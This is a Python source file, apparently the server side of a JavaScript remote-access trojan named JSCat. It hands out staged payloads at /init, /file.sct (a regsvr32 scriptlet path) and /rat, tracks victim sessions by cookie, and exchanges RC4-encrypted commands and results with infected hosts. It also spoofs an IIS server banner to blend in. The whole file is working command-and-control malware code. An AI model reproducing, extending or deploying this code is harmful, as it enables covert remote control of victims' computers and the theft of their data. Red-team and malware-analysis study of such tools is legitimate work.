#!/usr/bin/env python3
# coding:utf-8
from base64 import b64decode
from http.server import BaseHTTPRequestHandler
from lib.payload import Payload
from lib.color import BOLD
from lib.cipher import ARC4


class JSCatServer(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        """ Custom Log Handler to Spit out on to stderr """
        return

    def handle(self):
        self.session = self.server.session
        self.headers_to_send = []
        self.server_version = 'Microsoft-IIS/8.5'
        self.sys_version = ''

        return super().handle()

    def __encrypt_context(self, context):
        # context、key的type为 bytes，返回为bytes
        return ARC4.encrypt(context, self.server.rc4_key.encode())

    def __decrypt_context(self, context):
        # context、key的type为 str，返回为str
        return ARC4.decrypt(context, self.server.rc4_key)

    '''
    发送响应信息
    '''

    def __to_reply(self, reponse_code, context):
        content_type = "text/html"
        # 发送响应代码
        self.send_response(reponse_code)
        # 发送文件头
        self.send_header('Content-type', content_type)
        for header in self.headers_to_send:
            self.send_header(header['key'], header['value'])
        self.end_headers()
        # 发送正文
        self.wfile.write(context)

    '''
    检查cookie中的session
    '''

    def __check_cookie_session(self):
        session_key = None
        # 检查请求头的cookie是否带有session
        if self.headers['Cookie']:
            session_key_value = self.headers['Cookie'].split(';')[0].split(',')[
                0].split('=')
            if len(session_key_value) == 2 and session_key_value[0] == 'session':
                session_key = session_key_value[1]

        return session_key

    '''
    处理响应的context内容
    '''

    def __check_response(self, reponse_text):
        r0 = b64decode(reponse_text).decode()
        r1 = self.__decrypt_context(r0)
        res = r1.split('|')
        if len(res) >= 2:
            try:
                return int(res[0]), ''.join([res[x] for x in range(1, len(res))])
            except:
                return None, None
        else:
            return None, reponse_text

    '''
    处理GET请求
    '''

    def do_GET(self):
        context = b''
        if self.path.startswith('/init'):
            context = Payload.init(self.server.server_address)
            print('\n[+]received {} client:{}'.format(BOLD('INIT'),
                                                      BOLD(self.client_address[0])))
        elif self.path.startswith('/file.sct'):
            context = Payload.regsvr(self.server.server_address)
            print('\n[+]received {} client:{}'.format(BOLD("REGSVR32"),
                                                      BOLD(self.client_address[0])))
        elif self.path == '/rat':
            context = Payload.rat(
                self.server.server_address, self.server.rc4_key, self.server.sleep_time)
            self.server.shell.prompt_msg = '{} >'.format(
                self.client_address[0])
            print('\n[+]received {} client:{}'.format(BOLD('RAT'),
                                                      BOLD(self.client_address[0])))

        self.__to_reply(200, context)

    '''
    处理POST请求
    '''

    def do_POST(self):
        context = b''
        # 检查session
        session_key = self.__check_cookie_session()
        # 如果cookie中不存在session值，设置session值，执行session初始化任务
        if not session_key:
            self.headers_to_send.append(
                {'key': 'Set-Cookie', 'value': 'session={}'.format(self.session.get_random_session_key())})
            context = self.session.load_init_job()
        else:
            content_len = int(self.headers['content-length'])
            post_body = self.rfile.read(content_len)
            job_id, job_context = self.__check_response(post_body)
            # 如果session已存在，更新session状态、检查任务返回信息
            if session_key in self.session.SESSIONS:
                self.session.update_session(session_key)
                if job_id:
                    print('\n[+]received client:{},SID/JOB:{}/{}, bytes {}'.format(
                        BOLD(self.client_address[0]), BOLD(self.session.SESSIONS[session_key]['id']), BOLD(job_id), BOLD(content_len)))
                    self.session.check_job(session_key, job_id, job_context)
                # 获取待执行的一个任务:
                context = self.session.load_job(session_key)
            # 如果session未初始化，对返回job ID == 1的任务进行session初始化；否则重新执行初始化任务
            else:
                if job_id and job_id == 1:
                    print('\n[+]received {}, client:{},bytes {}'.format(BOLD('SESSION INIT'),
                                                                        BOLD(self.client_address[0]), BOLD(content_len)))
                    # JOB ID==1，表示这是session初始化任务
                    self.session.init_session(
                        session_key, self.client_address[0], self.headers['User-Agent'], job_context)
                    # 获取待执行的一个任务:
                    context = self.session.load_job(session_key)
                else:
                    context = self.session.load_init_job()

        self.__to_reply(200, self.__encrypt_context(context))
